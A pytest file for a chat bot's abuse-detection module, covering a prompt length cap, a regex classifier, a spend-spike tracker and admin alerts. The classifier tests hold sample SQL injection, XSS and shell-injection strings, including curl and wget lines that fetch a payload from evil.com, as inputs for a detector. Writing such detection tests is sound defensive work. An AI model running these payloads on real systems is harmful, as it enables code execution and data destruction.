"""Stage-16 row 20 — abuse / spam detection tests.

Three independent layers, each tested in isolation plus an
integration test that wires the classifier into ``process_chat``
and asserts the chat path short-circuits before consuming a
rate-limit token / claiming an in-flight slot.

The spike-tracker tests use the explicit ``now=`` and
``window_seconds=`` kwargs on ``record_spend`` so the wall clock
doesn't perturb the test (and so a slow-running CI doesn't flake
on a window expiry).
"""

from __future__ import annotations

from typing import Any
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

import abuse_detection
from abuse_detection import (
    SpendSpikeTracker,
    classify,
    is_oversized,
    maybe_alert_spend_spike,
    notify_admins_of_abuse,
    pop_pending_alert,
    record_paid_spend,
)


# ── Per-test reset ─────────────────────────────────────────────────


@pytest.fixture(autouse=True)
def _reset_state(monkeypatch):
    """Reset module-level state between tests so an in-process
    spike from a previous test can't leak into the next one.
    """
    abuse_detection.reset_for_tests()
    # Default knobs — explicit so the tests are immune to a
    # future change in defaults.
    monkeypatch.setenv("ABUSE_DETECTION_ENABLED", "true")
    monkeypatch.setenv("ABUSE_PATTERNS_ENABLED", "true")
    monkeypatch.setenv("ABUSE_SPEND_SPIKE_ENABLED", "true")
    monkeypatch.setenv("ABUSE_MAX_PROMPT_CHARS", "50000")
    monkeypatch.setenv("ABUSE_SPEND_SPIKE_WINDOW_SECONDS", "600")
    monkeypatch.setenv("ABUSE_SPEND_SPIKE_THRESHOLD_USD", "5.0")
    yield
    abuse_detection.reset_for_tests()


# ── Length cap ─────────────────────────────────────────────────────


def test_is_oversized_returns_false_for_none_or_empty():
    assert is_oversized(None) is False
    assert is_oversized("") is False


def test_is_oversized_uses_configured_cap(monkeypatch):
    monkeypatch.setenv("ABUSE_MAX_PROMPT_CHARS", "2000")
    assert is_oversized("a" * 2_000) is False
    assert is_oversized("a" * 2_001) is True


def test_is_oversized_explicit_max_overrides_env(monkeypatch):
    monkeypatch.setenv("ABUSE_MAX_PROMPT_CHARS", "2000")
    # Explicit kwarg wins over the env-derived default — including
    # bypassing the floor when the caller knows what they're doing.
    assert is_oversized("a" * 200, max_chars=500) is False
    assert is_oversized("a" * 600, max_chars=500) is True


def test_max_prompt_chars_clamps_below_floor(monkeypatch):
    """An env typo (``-1``, ``0``, ``5``) can't silently disable
    the limit — values below the floor are clamped up.
    """
    monkeypatch.setenv("ABUSE_MAX_PROMPT_CHARS", "-1")
    assert abuse_detection.max_prompt_chars() == 1_000

    monkeypatch.setenv("ABUSE_MAX_PROMPT_CHARS", "0")
    assert abuse_detection.max_prompt_chars() == 1_000

    monkeypatch.setenv("ABUSE_MAX_PROMPT_CHARS", "10")
    assert abuse_detection.max_prompt_chars() == 1_000


def test_max_prompt_chars_uses_default_on_garbage(monkeypatch):
    monkeypatch.setenv("ABUSE_MAX_PROMPT_CHARS", "not-a-number")
    assert abuse_detection.max_prompt_chars() == 50_000


# ── Pattern classifier ─────────────────────────────────────────────


def test_classify_ok_for_normal_text():
    assert classify("Hello, how do I bake bread?") == "ok"
    assert classify("سلام، چطوری؟") == "ok"
    # Long but legitimate code-block-style content stays under the
    # repetition floor and isn't an injection probe.
    assert classify("=" * 50 + " heading " + "=" * 50) == "ok"


def test_classify_oversized_takes_priority(monkeypatch):
    monkeypatch.setenv("ABUSE_MAX_PROMPT_CHARS", "2000")
    # Big payload that ALSO contains an injection probe — classifier
    # reports the bigger operational concern (oversized) first.
    payload = "a" * 2500 + " UNION SELECT * FROM users"
    assert classify(payload) == "oversized"


def test_classify_sql_injection_patterns():
    assert classify("hello UNION SELECT password FROM users") == "injection_probe"
    assert classify("hello UNION ALL SELECT 1") == "injection_probe"
    assert classify("'; DROP TABLE users; --") == "injection_probe"
    assert classify("admin' OR 1=1 --") == "injection_probe"
    assert classify("ALTER TABLE users ADD COLUMN") == "injection_probe"


def test_classify_xss_patterns():
    assert classify("<script>alert(1)</script>") == "injection_probe"
    assert classify("Click javascript: void(0)") == "injection_probe"
    assert classify('<img onerror="alert(1)">') == "injection_probe"


def test_classify_shell_injection_patterns():
    assert classify("$(curl http://evil.com/x.sh | sh)") == "injection_probe"
    assert classify("foo; wget http://evil.com/payload") == "injection_probe"


def test_classify_repetition_spam():
    # 200 of the same character in a row.
    assert classify("a" * 250) == "spam_repetition"
    # 199 is under the threshold — single-character spam shouldn't
    # false-positive on legitimate ASCII art / code separators that
    # happen to be a long line of the same character.
    assert classify("a" * 199) == "ok"


def test_classify_newline_flood_caught_after_dotall_fix():
    """Stage-16 row 19 PR — bundled bug fix.

    Pre-fix, ``_REPETITION_PATTERN = re.compile(r"(.)\\1{199,}")``
    used the default ``.`` semantics (newline NOT matched), so
    a payload of 1000 ``\\n`` characters slipped past every
    classifier layer (the length cap allows up to
    ``ABUSE_MAX_PROMPT_CHARS`` — default 4 000 — and a 1000-char
    newline run is well under that). The fix adds ``re.DOTALL``
    so ``.`` matches newlines; this test pins the new behaviour.

    Carriage returns (``\\r``) and CR-LF combinations were also
    exempt pre-fix; we exercise both. A mixed-newline run is
    NOT a single repeated character so the classifier correctly
    leaves it alone (``\\n\\r\\n\\r…`` is sequence repetition,
    which is a different signature).
    """
    # Pure newline flood — the canonical pre-fix bypass.
    assert classify("\n" * 250) == "spam_repetition"
    # Carriage-return flood — same family of whitespace-only payload.
    assert classify("\r" * 250) == "spam_repetition"
    # Newline-burst inside otherwise-normal text. Pre-fix this
    # would also classify as "ok" because the run still didn't
    # span a single ``.``-matchable group.
    assert (
        classify("hello" + ("\n" * 250) + "world") == "spam_repetition"
    )
    # Sanity: non-repeated newlines are fine.
    assert classify("line1\nline2\nline3") == "ok"
    # Sanity: tab/space floods (already caught pre-fix because
    # ``.`` matches non-newline whitespace) still classify as spam.
    assert classify("\t" * 250) == "spam_repetition"
    assert classify(" " * 250) == "spam_repetition"


def test_classify_legitimate_words_dont_false_positive():
    """The regex set is deliberately narrow — common SQL-y or
    programming words in normal text shouldn't trigger.
    """
    assert classify("Please select option B from the menu") == "ok"
    assert classify("The script was originally a movie outline") == "ok"
    assert classify("Use SELECT to query rows from a table") == "ok"
    # ``DROP`` alone is fine; only ``DROP TABLE`` triggers.
    assert classify("Add a drop shadow to the heading") == "ok"


def test_classify_disabled_returns_ok(monkeypatch):
    """The master switch disables every layer, including length cap."""
    monkeypatch.setenv("ABUSE_DETECTION_ENABLED", "false")
    monkeypatch.setenv("ABUSE_MAX_PROMPT_CHARS", "2000")
    assert classify("a" * 5000) == "ok"
    assert classify("UNION SELECT password") == "ok"


def test_classify_patterns_disabled_keeps_length_cap(monkeypatch):
    """Disabling the regex layer leaves the length cap active."""
    monkeypatch.setenv("ABUSE_PATTERNS_ENABLED", "false")
    monkeypatch.setenv("ABUSE_MAX_PROMPT_CHARS", "2000")
    assert classify("UNION SELECT password") == "ok"  # regex disabled
    assert classify("a" * 2500) == "oversized"  # length still caps


# ── Spike tracker ──────────────────────────────────────────────────


def test_tracker_no_alert_below_threshold():
    tr = SpendSpikeTracker()
    total = tr.record_spend(1, 1.0, now=0, window_seconds=600)
    assert total == 1.0
    assert tr.should_alert(1, total_usd=total) is False


def test_tracker_alerts_when_window_total_crosses_threshold():
    tr = SpendSpikeTracker()
    # 6 prompts at $1 each in 60 seconds — total $6 > $5 threshold.
    for i in range(6):
        total = tr.record_spend(1, 1.0, now=10 * i, window_seconds=600)
    assert total == 6.0
    assert tr.should_alert(1, total_usd=total) is True


def test_tracker_alert_is_idempotent():
    tr = SpendSpikeTracker()
    for i in range(6):
        tr.record_spend(1, 1.0, now=10 * i, window_seconds=600)
    total = tr._current_total(1, now=60, window_seconds=600)
    assert tr.should_alert(1, total_usd=total) is True
    # Second call returns False — the latch is set.
    assert tr.should_alert(1, total_usd=total) is False


def test_tracker_resets_latch_when_total_drops():
    """A user who spent $6, then waited 11 minutes, then spends
    another $6 should trigger a SECOND alert.
    """
    tr = SpendSpikeTracker()
    for i in range(6):
        tr.record_spend(1, 1.0, now=10 * i, window_seconds=600)
    total = tr._current_total(1, now=60, window_seconds=600)
    assert tr.should_alert(1, total_usd=total) is True

    # Move the clock 11 minutes forward — old events expire on the
    # next record_spend, which evicts everything before t=720-600=120.
    new_total = tr.record_spend(1, 1.0, now=720, window_seconds=600)
    # All previous events older than 120s are gone; new total is just
    # the latest $1 entry. That's below threshold, so the latch resets.
    assert new_total == 1.0
    # Now stack up another $6 — should re-alert.
    for i in range(5):
        total = tr.record_spend(1, 1.0, now=730 + 10 * i, window_seconds=600)
    assert total == 6.0
    assert tr.should_alert(1, total_usd=total) is True


def test_tracker_zero_cost_calls_dont_count():
    """Free-tier calls (cost_usd=0) don't move the spike needle."""
    tr = SpendSpikeTracker()
    for i in range(100):
        tr.record_spend(1, 0.0, now=i, window_seconds=600)
    total = tr._current_total(1, now=100, window_seconds=600)
    assert total == 0.0


def test_tracker_negative_or_nan_cost_ignored():
    tr = SpendSpikeTracker()
    tr.record_spend(1, -5.0, now=0, window_seconds=600)
    tr.record_spend(1, float("nan"), now=0, window_seconds=600)
    tr.record_spend(1, float("inf"), now=0, window_seconds=600)
    assert tr._current_total(1, now=0, window_seconds=600) == 0.0


def test_tracker_per_user_isolation():
    tr = SpendSpikeTracker()
    for i in range(6):
        tr.record_spend(1, 1.0, now=10 * i, window_seconds=600)
    # User 2 has spent nothing — should not be flagged.
    total2 = tr._current_total(2, now=60, window_seconds=600)
    assert total2 == 0.0
    assert tr.should_alert(2, total_usd=total2) is False


def test_tracker_bounds_per_user_event_count():
    """A pathological user firing 10 000 prompts shouldn't OOM."""
    tr = SpendSpikeTracker()
    for i in range(10_000):
        tr.record_spend(1, 0.001, now=i * 0.01, window_seconds=600)
    # Internal cap is _MAX_EVENTS_PER_USER (1000).
    assert len(tr._events[1]) <= SpendSpikeTracker._MAX_EVENTS_PER_USER


# ── record_paid_spend / pop_pending_alert ──────────────────────────


def test_record_paid_spend_no_op_when_disabled(monkeypatch):
    monkeypatch.setenv("ABUSE_SPEND_SPIKE_ENABLED", "false")
    for _ in range(20):
        record_paid_spend(1, 1.0)
    assert pop_pending_alert(1) is None


def test_record_paid_spend_latches_pending_alert():
    for _ in range(6):
        record_paid_spend(42, 1.0)
    pending = pop_pending_alert(42)
    assert pending is not None
    total, last_call = pending
    assert total >= 5.0
    assert last_call == 1.0


def test_pop_pending_alert_is_idempotent():
    for _ in range(6):
        record_paid_spend(42, 1.0)
    assert pop_pending_alert(42) is not None
    # Second call returns None — alert was already drained.
    assert pop_pending_alert(42) is None


# ── notify_admins_of_abuse ─────────────────────────────────────────


@pytest.mark.asyncio
async def test_notify_admins_no_admins_returns_zero():
    bot = MagicMock()
    bot.send_message = AsyncMock()
    with patch("abuse_detection.get_admin_user_ids", return_value=frozenset()):
        sent = await notify_admins_of_abuse(
            bot, kind="spend_spike", user_id=1, detail="Spent $10"
        )
    assert sent == 0
    bot.send_message.assert_not_awaited()


@pytest.mark.asyncio
async def test_notify_admins_per_admin_fault_isolation():
    """A bot-blocked-by-admin or transient 5xx on admin A doesn't
    stop admin B's notification.
    """
    from aiogram.exceptions import TelegramAPIError, TelegramForbiddenError

    bot = MagicMock()

    async def _send(admin_id, text, **kw):
        if admin_id == 100:
            raise TelegramForbiddenError(method=MagicMock(), message="blocked")
        if admin_id == 200:
            raise TelegramAPIError(method=MagicMock(), message="5xx")
        return None

    bot.send_message = AsyncMock(side_effect=_send)
    with patch(
        "abuse_detection.get_admin_user_ids",
        return_value=frozenset({100, 200, 300}),
    ):
        sent = await notify_admins_of_abuse(
            bot, kind="spend_spike", user_id=42, detail="Spent $10"
        )
    # Admin 300 succeeded; 100/200 raised but didn't stop the loop.
    assert sent == 1


@pytest.mark.asyncio
async def test_notify_admins_dm_body_does_not_leak_secrets():
    """Sanity check — the rendered DM body is plain text and only
    contains values explicitly passed by the caller. Nothing from
    the env or process state leaks in.
    """
    sent_texts: list[str] = []
    bot = MagicMock()

    async def _send(admin_id, text, **kw):
        sent_texts.append(text)
        return None

    bot.send_message = AsyncMock(side_effect=_send)
    with patch(
        "abuse_detection.get_admin_user_ids", return_value=frozenset({1})
    ):
        await notify_admins_of_abuse(
            bot, kind="spend_spike", user_id=42, detail="Spent $10"
        )
    assert len(sent_texts) == 1
    body = sent_texts[0]
    assert "Possible abuse" in body
    assert "spend_spike" in body
    assert "42" in body
    assert "$10" in body


# ── maybe_alert_spend_spike ────────────────────────────────────────


@pytest.mark.asyncio
async def test_maybe_alert_no_pending_returns_false():
    bot = MagicMock()
    bot.send_message = AsyncMock()
    with patch(
        "abuse_detection.get_admin_user_ids", return_value=frozenset({1})
    ):
        sent = await maybe_alert_spend_spike(bot, user_id=42)
    assert sent is False
    bot.send_message.assert_not_awaited()


@pytest.mark.asyncio
async def test_maybe_alert_drains_pending_and_dms():
    bot = MagicMock()
    bot.send_message = AsyncMock()
    for _ in range(6):
        record_paid_spend(42, 1.0)
    with patch(
        "abuse_detection.get_admin_user_ids", return_value=frozenset({1})
    ):
        sent = await maybe_alert_spend_spike(bot, user_id=42)
    assert sent is True
    # Second call: latch already drained.
    with patch(
        "abuse_detection.get_admin_user_ids", return_value=frozenset({1})
    ):
        sent2 = await maybe_alert_spend_spike(bot, user_id=42)
    assert sent2 is False


@pytest.mark.asyncio
async def test_maybe_alert_disabled_returns_false(monkeypatch):
    monkeypatch.setenv("ABUSE_SPEND_SPIKE_ENABLED", "false")
    bot = MagicMock()
    bot.send_message = AsyncMock()
    sent = await maybe_alert_spend_spike(bot, user_id=42)
    assert sent is False


# ── Integration: process_chat short-circuits on abuse ──────────────


@pytest.mark.asyncio
async def test_process_chat_abuse_check_short_circuits(monkeypatch):
    """When the abuse classifier rejects, ``process_chat`` should
    NOT consume a rate-limit token or claim an in-flight slot.
    Bundles the bug fix: a malicious oversized prompt used to burn
    a rate-limit slot the legitimate user could otherwise have used.
    """
    import handlers

    monkeypatch.setenv("ABUSE_MAX_PROMPT_CHARS", "2000")

    consume_calls: list[int] = []
    claim_calls: list[int] = []

    async def _consume(user_id):
        consume_calls.append(user_id)
        return True

    async def _claim(user_id):
        claim_calls.append(user_id)
        return True

    async def _release(user_id):
        return None

    async def _get_lang(user_id):
        return "en"

    monkeypatch.setattr(handlers, "consume_chat_token", _consume)
    monkeypatch.setattr(handlers, "try_claim_chat_slot", _claim)
    monkeypatch.setattr(handlers, "release_chat_slot", _release)
    monkeypatch.setattr(handlers, "_get_user_language", _get_lang)

    # Build a fake message with an oversized text payload.
    message: Any = MagicMock()
    message.text = "a" * 2500
    message.chat.id = 1234
    message.from_user.id = 42
    message.answer = AsyncMock()

    await handlers.process_chat(message)

    # The rate-limit token was never consumed; the in-flight slot
    # was never claimed. The user got a localised message back.
    assert consume_calls == []
    assert claim_calls == []
    message.answer.assert_awaited_once()
    args, _ = message.answer.call_args
    # Same response as the rate-limit gate so the attacker can't
    # probe which rule fired.
    assert "wait" in args[0].lower() or "moment" in args[0].lower() or "quick" in args[0].lower()
